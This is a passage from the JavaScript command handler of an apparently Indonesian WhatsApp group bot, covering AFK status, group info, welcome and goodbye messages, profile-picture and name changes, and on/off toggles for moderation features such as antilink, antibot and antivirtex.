			case 'afk': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (m.key.fromMe) return m.warning('Bot Tidak Dapat Afk.')
				if (isAfkOn) return m.warning('Afk sudah diaktifkan sebelumnya')
				let reason = text ? text : 'Nothing.'
				afk.addAfkUser(m.sender, Date.now(), reason, _afk)
				vreden.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} sedang afk\nAlasan : ${reason}`, m)
			}
			break
			case 'infogc':
			case 'infogrup': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				try {
					let data = await vreden.groupMetadata(m.chat)
					var infogc = `----------- » *GRUP INFO* « -----------

*PLUGINS INSPECT* :
- *antibot* : ${chatsdb[m.chat].antibot ? 'true' : ''}
- *antibot 2* : ${chatsdb[m.chat].antibot2 ? 'true' : ''}
- *antilink* : ${chatsdb[m.chat].antilink ? 'true' : ''}
- *antilink tiktok* : ${chatsdb[m.chat].antilinktt ? 'true' : ''}
- *antitoxic* : ${chatsdb[m.chat].antitoxic ? 'true' : ''}
- *antiaudio* : ${chatsdb[m.chat].antiaudio ? 'true' : ''}
- *antisticker* : ${chatsdb[m.chat].antisticker ? 'true' : ''}
- *antiimage* : ${chatsdb[m.chat].antiimage ? 'true' : ''}
- *antivideo* : ${chatsdb[m.chat].antivideo ? 'true' : ''}
- *antidocument* : ${chatsdb[m.chat].antidocument ? 'true' : ''}
- *antivirtex* : ${chatsdb[m.chat].antivirtex ? 'true' : ''}
- *antipromosi* : ${chatsdb[m.chat].antipromosi ? 'true' : ''}
- *antiwame* : ${chatsdb[m.chat].antiwame ? 'true' : ''}
- *antiwame2* : ${chatsdb[m.chat].antiwame2 ? 'true' : ''}
- *antipolling* : ${chatsdb[m.chat].antipolling ? 'true' : ''}
- *antilinkall* : ${chatsdb[m.chat].antilinkall ? 'true' : ''}
- *antilink2* : ${chatsdb[m.chat].antilink2 ? 'true' : ''}
- *autodownload* : ${chatsdb[m.chat].autodl ? 'true' : ''}
- *auto ai gc* : ${chatsdb[m.chat].autoaigc ? 'true' : ''}
- *kick me* : ${chatsdb[m.chat].kickme ? 'true' : ''}
- *keamanan* : ${chatsdb[m.chat].keamanan ? 'true' : ''}
- *mute* : ${chatsdb[m.chat].mute ? 'true' : ''}
- *welcome* : ${chatsdb[m.chat].welcome ? 'true' : ''}
- *left* : ${chatsdb[m.chat].goodbye ? 'true' : ''}

*GROUP INFO* :
- *name* : ${data.subject}
- *ID* : ${data.id}
- *dibuat* : ${moment(data.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}
- *owner grup* : ${data.owner !== undefined ? '@' + data.owner.split`@`[0] : 'Unknown'}
- *jumlah admin* : ${data.participants.filter(x => x.admin === 'admin').length} Ekor
- *jumlah peserta* : ${data.participants.filter(x => x.admin === null).length} Ekor

`
					let button = [{
						"name": "single_select",
						"buttonParamsJson": `{
  "title": "Setting Group",
  "sections": [
    {
      "title": "AntiLink Grup",
      "rows": [
        {
          "header": "On 🟢",
          "title": "antilink on",
          "description": "nyalakan antilink",
          "id": ".antilink on"
        },
        {
          "header": "Off 🔴",
          "title": "antilink off",
          "description": "matikan antilink",
          "id": ".antilink off"
        }
      ]
    },
    {
      "title": "AntiBot Grup",
      "rows": [
        {
          "header": "On 🟢",
          "title": "antibot on",
          "description": "nyalakan antibot",
          "id": ".antibot on"
        },
        {
          "header": "Off 🔴",
          "title": "antibot off",
          "description": "matikan antibot",
          "id": ".antibot off"
        }
      ]
    },
    {
      "title": "AntiBot V2 Grup",
      "rows": [
        {
          "header": "On 🟢",
          "title": "antibot2 on",
          "description": "nyalakan antibot2",
          "id": ".antibot2 on"
        },
        {
          "header": "Off 🔴",
          "title": "antibot2 off",
          "description": "matikan antibot2",
          "id": ".antibot2 off"
        }
      ]
    },
    {
      "title": "AntiLink2 Grup",
      "rows": [
        {
          "header": "On 🟢",
          "title": "antilink2 on",
          "description": "nyalakan antilink2",
          "id": ".antilink2 on"
        },
        {
          "header": "Off 🔴",
          "title": "antilink2 off",
          "description": "matikan antilink2",
          "id": ".antilink2 off"
        }
      ]
    },
    {
      "title": "AntiVirtext Grup",
      "rows": [
        {
          "header": "On 🟢",
          "title": "antivirtex on",
          "description": "nyalakan antivirtex",
          "id": ".antivirtex on"
        },
        {
          "header": "Off 🔴",
          "title": "antivirtex off",
          "description": "matikan antivirtex",
          "id": ".antivirtex off"
        }
      ]
    },
    {
      "title": "AntiLink TikTok Grup",
      "rows": [
        {
          "header": "On 🟢",
          "title": "antilinktt on",
          "description": "nyalakan antilinktt",
          "id": ".antilinktt on"
        },
        {
          "header": "Off 🔴",
          "title": "antilinktt off",
          "description": "matikan antilinktt",
          "id": ".antilinktt off"
        }
      ]
    },
    {
      "title": "AntiToxic Grup",
      "rows": [
        {
          "header": "On 🟢",
          "title": "antitoxic on",
          "description": "nyalakan antitoxic",
          "id": ".antitoxic on"
        },
        {
          "header": "Off 🔴",
          "title": "antitoxic off",
          "description": "matikan antitoxic",
          "id": ".antitoxic off"
        }
      ]
    },
    {
      "title": "AntiWaMe Grup",
      "rows": [
        {
          "header": "On 🟢",
          "title": "antiwame on",
          "description": "nyalakan antiwame",
          "id": ".antiwame on"
        },
        {
          "header": "Off 🔴",
          "title": "antiwame off",
          "description": "matikan antiwame",
          "id": ".antiwame off"
        }
      ]
    },
    {
      "title": "AntiWaMe2 Grup",
      "rows": [
        {
          "header": "On 🟢",
          "title": "antiwame2 on",
          "description": "nyalakan antiwame2",
          "id": ".antiwame2 on"
        },
        {
          "header": "Off 🔴",
          "title": "antiwame2 off",
          "description": "matikan antiwame2",
          "id": ".antiwame2 off"
        }
      ]
    },
    {
      "title": "AntiLinkall Grup",
      "rows": [
        {
          "header": "On 🟢",
          "title": "antilinkall on",
          "description": "nyalakan antilinkall",
          "id": ".antilinkall on"
        },
        {
          "header": "Off 🔴",
          "title": "antilinkall off",
          "description": "matikan antilinkall",
          "id": ".antilinkall off"
        }
      ]
    },
    {
      "title": "Antisticker Grup",
      "rows": [
        {
          "header": "On 🟢",
          "title": "antisticker on",
          "description": "nyalakan antisticker",
          "id": ".antisticker on"
        },
        {
          "header": "Off 🔴",
          "title": "antisticker off",
          "description": "matikan antisticker",
          "id": ".antisticker off"
        }
      ]
    },
    {
      "title": "AntiImage Grup",
      "rows": [
        {
          "header": "On 🟢",
          "title": "antiimage on",
          "description": "nyalakan antiimage",
          "id": ".antiimage on"
        },
        {
          "header": "Off 🔴",
          "title": "antiimage off",
          "description": "matikan antiimage",
          "id": ".antiimage off"
        }
      ]
    },
    {
      "title": "AntiAudio Grup",
      "rows": [
        {
          "header": "On 🟢",
          "title": "antiaudio on",
          "description": "nyalakan antiaudio",
          "id": ".antiaudio on"
        },
        {
          "header": "Off 🔴",
          "title": "antiaudio off",
          "description": "matikan antiaudio",
          "id": ".antiaudio off"
        }
      ]
    },
    {
      "title": "AntiVideo Grup",
      "rows": [
        {
          "header": "On 🟢",
          "title": "antivideo on",
          "description": "nyalakan antivideo",
          "id": ".antivideo on"
        },
        {
          "header": "Off 🔴",
          "title": "antivideo off",
          "description": "matikan antivideo",
          "id": ".antivideo off"
        }
      ]
    },
    {
      "title": "AntiDocument Grup",
      "rows": [
        {
          "header": "On 🟢",
          "title": "antidocument on",
          "description": "nyalakan antidocument",
          "id": ".antidocument on"
        },
        {
          "header": "Off 🔴",
          "title": "antidocument off",
          "description": "matikan antidocument",
          "id": ".antidocument off"
        }
      ]
    },
    {
      "title": "AntiPromosi Grup",
      "rows": [
        {
          "header": "On 🟢",
          "title": "antipromosi on",
          "description": "nyalakan antipromosi",
          "id": ".antipromosi on"
        },
        {
          "header": "Off 🔴",
          "title": "antipromosi off",
          "description": "matikan antipromosi",
          "id": ".antipromosi off"
        }
      ]
    },
    {
      "title": "AntiPolling Grup",
      "rows": [
        {
          "header": "On 🟢",
          "title": "antipolling on",
          "description": "nyalakan antipolling",
          "id": ".antipolling on"
        },
        {
          "header": "Off 🔴",
          "title": "antipolling off",
          "description": "matikan antipolling",
          "id": ".antipolling off"
        }
      ]
    },
    {
      "title": "Auto Download Grup",
      "rows": [
        {
          "header": "On 🟢",
          "title": "autodl on",
          "description": "nyalakan autodl",
          "id": ".autodl on"
        },
        {
          "header": "Off 🔴",
          "title": "autodl off",
          "description": "matikan autodl",
          "id": ".autodl off"
        }
      ]
    },
    {
      "title": "Auto Ai Grup",
      "rows": [
        {
          "header": "On 🟢",
          "title": "autoaigrup on",
          "description": "nyalakan autoaigrup",
          "id": ".autoaigrup on"
        },
        {
          "header": "Off 🔴",
          "title": "autoaigrup off",
          "description": "matikan autoaigrup",
          "id": ".autoaigrup off"
        }
      ]
    },
    {
      "title": "Auto Kick Me",
      "rows": [
        {
          "header": "On 🟢",
          "title": "kickme on",
          "description": "nyalakan kickme",
          "id": ".kickme on"
        },
        {
          "header": "Off 🔴",
          "title": "kickme off",
          "description": "matikan kickme",
          "id": ".kickme off"
        }
      ]
    },
    {
      "title": "Keamanan Grup",
      "rows": [
        {
          "header": "On 🟢",
          "title": "keamanan on",
          "description": "nyalakan keamanan",
          "id": ".keamanan on"
        },
        {
          "header": "Off 🔴",
          "title": "keamanan off",
          "description": "matikan keamanan",
          "id": ".keamanan off"
        }
      ]
    },
    {
      "title": "Mute Grup",
      "rows": [
        {
          "header": "On 🟢",
          "title": "mute on",
          "description": "nyalakan mute",
          "id": ".mute on"
        },
        {
          "header": "Off 🔴",
          "title": "mute off",
          "description": "matikan mute",
          "id": ".mute off"
        }
      ]
    },
    {
      "title": "Welcome Grup",
      "rows": [
        {
          "header": "On 🟢",
          "title": "welcome on",
          "description": "nyalakan welcome",
          "id": ".welcome on"
        },
        {
          "header": "Off 🔴",
          "title": "welcome off",
          "description": "matikan welcome",
          "id": ".welcome off"
        }
      ]
    },
    {
      "title": "GoodByee Grup",
      "rows": [
        {
          "header": "On 🟢",
          "title": "left on",
          "description": "nyalakan left",
          "id": ".left on"
        },
        {
          "header": "Off 🔴",
          "title": "left off",
          "description": "matikan left",
          "id": ".left off"
        }
      ]
    }
  ]
}`
					}, {
						"name": "cta_copy",
						"buttonParamsJson": `{\"display_text\":\"Copy ID\",\"id\":\"123456789\",\"copy_code\":\"${data.id}\"}`
					}]
					let buffer = await getBuffer("https://pomf2.lain.la/f/v31lzha.jpg")
					vreden.sendButtonDocument(m.chat, {
						document: fs.readFileSync('./media/thumbnail.jpg'),
						mimetype: "image/png",
						fileLength: 10000000000,
						jpegThumbnail: buffer,
						fileName: `👥 Group Info 👥`,
					}, button, infogc, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'welcome':
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (args[0] === "on") {
					if (chatsdb[m.chat].welcome) return m.reply(`Udah on`)
					chatsdb[m.chat].welcome = true
					m.reply('Sukses mengaktifkan welcome di grup ini')
				} else if (args[0] === "off") {
					if (!chatsdb[m.chat].welcome) return m.reply(`Udah off`)
					chatsdb[m.chat].welcome = false
					m.reply('Sukses menonaktifkan welcome di grup ini')
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
				break
			case 'left':
			case 'goodbye':
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (args[0] === "on") {
					if (chatsdb[m.chat].goodbye) return m.reply(`Udah on`)
					chatsdb[m.chat].goodbye = true
					m.reply('Sukses mengaktifkan goodbye di grup ini')
				} else if (args[0] === "off") {
					if (!chatsdb[m.chat].goodbye) return m.reply(`Udah off`)
					chatsdb[m.chat].goodbye = false
					m.reply('Sukses menonaktifkan goodbye di grup ini')
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
				break
			case 'setwelcome': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isCreator && !isAdmins) return m.tolak(mess.GrupAdmin)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *teks_welcome*\n\n_Contoh_\n\n${prefix+command} Halo @user, Selamat datang di @group`)
				chatsdb[m.chat].setwelcome = text
				m.reply(`Welcome text di ubah ke:\n\n${text}`)
			}
			break
			case 'delsetwelcome': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isCreator && !isAdmins) return m.tolak(mess.GrupAdmin)
				if (!chatsdb[m.chat].setwelcome) return m.warning("Pesan left sudah default sebelumnya")
				chatsdb[m.chat].setwelcome = false
				m.reply(`Welcome text di ubah ke default`)
			}
			break
			case 'setleft': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isCreator && !isAdmins) return m.tolak(mess.GrupAdmin)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix + command} *teks_left*\n\n_Contoh_\n\n${prefix + command} Halo @user, Selamat tinggal dari @group`)
				chatsdb[m.chat].setleft = text
				m.reply(`GoodBye text di ubah ke:\n\n${text}`)
			}
			break
			case 'delsetleft': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isCreator && !isAdmins) return m.tolak(mess.GrupAdmin)
				if (!chatsdb[m.chat].setleft) return m.warning("Pesan left sudah default sebelumnya")
				chatsdb[m.chat].setleft = false
				m.reply(`GoodBye text di ubah ke default`)
			}
			break
			case 'linkgrup':
			case 'linkgroup':
			case 'linkgc': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				let response = await vreden.groupInviteCode(m.chat)
				vreden.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, {
					detectLink: true
				})
			}
			break
			case 'pppanjang':
			case 'setppbot2': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!quoted) return m.warning(`Reply foto dgn caption ${prefix + command}`)
				if (!/image/.test(mime)) return m.warning(`Reply foto dgn caption ${prefix + command}`)
				if (/webp/.test(mime)) return m.warning(`Reply foto dgn caption ${prefix + command}`)
				let media = await vreden.downloadAndSaveMediaMessage(quoted)
				var {
					img
				} = await generateProfilePicture(media)
				await vreden.query({
					tag: 'iq',
					attrs: {
						to: botNumber,
						type: 'set',
						xmlns: 'w:profile:picture'
					},
					content: [{
						tag: 'picture',
						attrs: {
							type: 'image'
						},
						content: img
					}]
				})
				m.reply("Done!!!")
			}
			break
			case 'pppanjanggc':
			case 'ppgcfull':
			case 'setppgc2': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (!quoted) return m.warning(`Reply foto dgn caption ${prefix + command}`)
				if (!/image/.test(mime)) return m.warning(`Reply foto dgn caption ${prefix + command}`)
				if (/webp/.test(mime)) return m.warning(`Reply foto dgn caption ${prefix + command}`)
				let media = await vreden.downloadAndSaveMediaMessage(quoted)
				var {
					img
				} = await generateProfilePicture(media)
				await vreden.query({
					tag: 'iq',
					attrs: {
						to: m.chat,
						type: 'set',
						xmlns: 'w:profile:picture'
					},
					content: [{
						tag: 'picture',
						attrs: {
							type: 'image'
						},
						content: img
					}]
				})
				m.reply("Done!!!")
			}
			break
			case 'setppgroup':
			case 'setppgrup':
			case 'setppgc': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (!quoted) return m.warning(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
				if (!/image/.test(mime)) return m.warning(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
				if (/webp/.test(mime)) return m.warning(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
				let media = await vreden.downloadAndSaveMediaMessage(quoted)
				await vreden.updateProfilePicture(m.chat, {
					url: media
				}).catch((err) => fs.unlinkSync(media))
				m.reply("Berhasil mengganti pp group")
			}
			break
			case 'setname':
			case 'setsubject': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (!text) return m.warning(`*Masukan Input Query!*\n\nContoh ${prefix + command} WhatsApp Bot`)
				await vreden.groupUpdateSubject(m.chat, text).then((res) => m.reply("Done")).catch((err) => m.reply(jsonformat(err)))
			}
			break
			case 'setdesc':
			case 'setdesk': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (!text) return m.warning(`*Masukan Input Query!*\n\nContoh ${prefix + command} WhatsApp Bot`)
				await vreden.groupUpdateDescription(m.chat, text).then((res) => m.reply("Done")).catch((err) => m.reply(jsonformat(err)))
			}
			break
			case 'autoaigrup':
			case 'aigrup':
			case 'autoaigc': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (args[0] === "on") {
					if (chatsdb[m.chat].autoaigc) return m.reply(`Udah aktif`)
					chatsdb[m.chat].autoaigc = true
					m.reply('Successfully Activate Auto AI')
				} else if (args[0] === "off") {
					if (!chatsdb[m.chat].autoaigc) return m.reply(`Udah nonaktif`)
					chatsdb[m.chat].autoaigc = false
					m.reply('Successfully Disabling Auto AI')
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'autoaijapri':
			case 'aipc':
			case 'autoaipc': {
				if (m.isGroup) return m.warning('Fitur Khusus Japri!')
				if (args[0] === "on") {
					if (chatsdb[m.chat].autoaipc) return m.reply(`Udah aktif`)
					chatsdb[m.chat].autoaipc = true
					m.reply('Successfully Activate Auto AI')
				} else if (args[0] === "off") {
					if (!chatsdb[m.chat].autoaipc) return m.reply(`Udah nonaktif`)
					chatsdb[m.chat].autoaipc = false
					m.reply('Successfully Disabling Auto AI')
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'antibot': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (args[0] === "on") {
					if (chatsdb[m.chat].antibot) return m.reply(`Udah aktif`)
					chatsdb[m.chat].antibot = true
					m.reply('Successfully Activate Antibot In This Group')
				} else if (args[0] === "off") {
					if (!chatsdb[m.chat].antibot) return m.reply(`Udah nonaktif`)
					chatsdb[m.chat].antibot = false
					m.reply('Successfully Disabling Antibot In This Group')
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'antibot2': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (args[0] === "on") {
					if (chatsdb[m.chat].antibot2) return m.reply(`Udah aktif`)
					chatsdb[m.chat].antibot2 = true
					m.reply('Successfully Activate Antibot V2 In This Group')
				} else if (args[0] === "off") {
					if (!chatsdb[m.chat].antibot2) return m.reply(`Udah nonaktif`)
					chatsdb[m.chat].antibot2 = false
					m.reply('Successfully Disabling Antibot V2 In This Group')
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'antilink': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (args[0] === "on") {
					if (chatsdb[m.chat].antilink) return m.reply(`Udah aktif`)
					chatsdb[m.chat].antilink = true
					chatsdb[m.chat].antilink2 = false
					m.reply('Successfully Activate Antilink In This Group')
				} else if (args[0] === "off") {
					if (!chatsdb[m.chat].antilink) return m.reply(`Udah nonaktif`)
					chatsdb[m.chat].antilink = false
					m.reply('Successfully Disabling Antilink In This Group')
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'antipolling': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (args[0] === "on") {
					if (chatsdb[m.chat].antipolling) return m.reply(`Udah aktif`)
					chatsdb[m.chat].antipolling = true
					m.reply('Successfully Activate Anti Polling In This Group')
				} else if (args[0] === "off") {
					if (!chatsdb[m.chat].antipolling) return m.reply(`Udah nonaktif`)
					chatsdb[m.chat].antipolling = false
					m.reply('Successfully Disabling Anti Polling In This Group')
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'antilinkall': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (args[0] === "on") {
					if (chatsdb[m.chat].antilinkall) return m.reply(`Udah aktif`)
					chatsdb[m.chat].antilinkall = true
					m.reply('Successfully Activate Antilink All In This Group')
				} else if (args[0] === "off") {
					if (!chatsdb[m.chat].antilinkall) return m.reply(`Udah nonaktif`)
					chatsdb[m.chat].antilinkall = false
					m.reply('Successfully Disabling Antilink All In This Group')
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'antilink2': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (args[0] === "on") {
					if (chatsdb[m.chat].antilink2) return m.reply(`Udah aktif`)
					chatsdb[m.chat].antilink2 = true
					chatsdb[m.chat].antilink = false
					m.reply('Successfully Activate Antilink2 In This Group')
				} else if (args[0] === "off") {
					if (!chatsdb[m.chat].antilink2) return m.reply(`Udah nonaktif`)
					chatsdb[m.chat].antilink2 = false
					m.reply('Successfully Disabling Antilink2 In This Group')
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'antivirtex': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (args[0] === "on") {
					if (chatsdb[m.chat].antivirtex) return m.reply(`Udah aktif`)
					chatsdb[m.chat].antivirtex = true
					m.reply('Successfully Activate Antivirtex In This Group')
				} else if (args[0] === "off") {
					if (!chatsdb[m.chat].antivirtex) return m.reply(`Udah nonaktif`)
					chatsdb[m.chat].antivirtex = false
					m.reply('Successfully Disabling Antivirtex In This Group')
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'antipromosi': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (args[0] === "on") {
					if (chatsdb[m.chat].antipromosi) return m.reply(`Udah aktif`)
					chatsdb[m.chat].antipromosi = true
					m.reply('Successfully Activate Antipromosi In This Group')
				} else if (args[0] === "off") {
					if (!chatsdb[m.chat].antipromosi) return m.reply(`Udah nonaktif`)
					chatsdb[m.chat].antipromosi = false
					m.reply('Successfully Disabling Antipromosi In This Group')
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'autodl': {
				if (args[0] === "on") {
					if (chatsdb[m.chat].autodl) return m.reply(`Udah aktif`)
					chatsdb[m.chat].autodl = true
					m.reply('Successfully Activate Autodl In This Chat')
				} else if (args[0] === "off") {
					if (!chatsdb[m.chat].autodl) return m.reply(`Udah nonaktif`)
					chatsdb[m.chat].autodl = false
					m.reply('Successfully Disabling Autodl In This Chat')
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'keamanan': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (args[0] === "on") {
					if (chatsdb[m.chat].keamanan) return m.reply(`Udah aktif`)
					chatsdb[m.chat].keamanan = true
					if (!chatsdb[m.chat].antivirtex) {
						chatsdb[m.chat].antivirtex = true
					}
					if (!chatsdb[m.chat].mute) {
						chatsdb[m.chat].mute = true
					}
					if (!chatsdb[m.chat].antilink2) {
						chatsdb[m.chat].antilink2 = true
					}
					m.reply('Successfully Activate Keamanan In This Chat\n\n*Hard Mode*')
				} else if (args[0] === "off") {
					if (!chatsdb[m.chat].keamanan) return m.reply(`Udah nonaktif`)
					chatsdb[m.chat].keamanan = false
					if (chatsdb[m.chat].antilink2) {
						chatsdb[m.chat].antilink2 = false
					}
					if (chatsdb[m.chat].mute) {
						chatsdb[m.chat].mute = false
					}
					if (chatsdb[m.chat].antivirtex) {
						chatsdb[m.chat].antivirtex = false
					}
					m.reply('Successfully Disabling Keamanan In This Chat')
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
